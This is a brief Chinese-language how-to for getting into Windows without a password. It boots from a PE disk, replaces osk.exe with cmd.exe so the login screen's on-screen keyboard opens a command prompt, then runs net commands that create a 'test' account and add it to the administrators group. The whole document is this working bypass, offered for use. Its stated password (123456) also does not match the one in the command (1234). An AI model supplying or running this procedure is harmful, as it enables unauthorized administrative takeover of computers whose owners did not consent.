# 无密码进入Windows系统
很老的一个方案,但依然有效.
1. 用PE启动电脑
2. 将原`C:\Windows\System32\osk.exe`文件改为`C:\Windows\System32\osk.exe.bak`
3. 将`C:\Windows\System32\cmd.exe`复制为`C:\Windows\System32\osk.exe`
4. 退出PE,启动电脑,登录界面选择屏幕键盘,此时会弹出命令行窗口
5. 执行,新建test用户,密码为123456,加入管理员组
    ```bat
    net user test 1234 /add
    net localgroup administrators test /add
    ```

能物理接触计算机用不着如此麻烦,但有些情况下还是有用的